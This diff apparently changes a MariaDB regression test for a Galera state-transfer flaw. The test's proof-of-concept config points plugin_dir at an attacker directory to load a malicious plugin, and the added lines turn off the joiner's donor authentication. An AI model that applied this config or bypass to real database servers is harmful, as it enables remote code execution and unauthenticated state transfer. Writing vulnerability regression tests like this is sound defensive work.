@@ -60,6 +60,7 @@ perl;
   use strict;
   use warnings;
   use File::Basename;
+  use File::Copy;
   use IO::Socket::INET;
   use POSIX ":sys_wait_h";
 
@@ -111,6 +112,15 @@ perl;
                      "last_lsn = 0\nrecover_binlog_info = 0\n";
   my $backup_cnf = "[mysqld]\nplugin_dir=$attacker_plugins\n" .
                    "plugin_load=mdev42091_poc=mdev42091_poc\n";
+
+  # not testing auth; skip the joiner's secret requirement instead of
+  # forging it too. --defaults-extra-file is ignored once --defaults-file
+  # is given, so append to a copy of it instead of layering a second file
+  my $joiner_cnf = "$attack/joiner.cnf";
+  copy($defaults_file, $joiner_cnf) or die $!;
+  open(my $jcf, '>>', $joiner_cnf) or die $!;
+  print $jcf "\n[sst]\nsst-mariabackup-allow-unauthenticated-donor=1\n";
+  close($jcf);
 
   for my $dir ($stage1, $stage2) {
     open(my $fh, '>', "$dir/mariadb_backup_galera_info") or die $!; print $fh $coords; close $fh;
@@ -195,7 +205,7 @@ perl;
          '--role', 'joiner',
          '--address', $addr,
          '--datadir', "$datadir/",
-         '--defaults-file', $defaults_file,
+         '--defaults-file', $joiner_cnf,
          '--defaults-group-suffix', '.2',
          '--parent', $parent_pid,
          '--progress', '0',
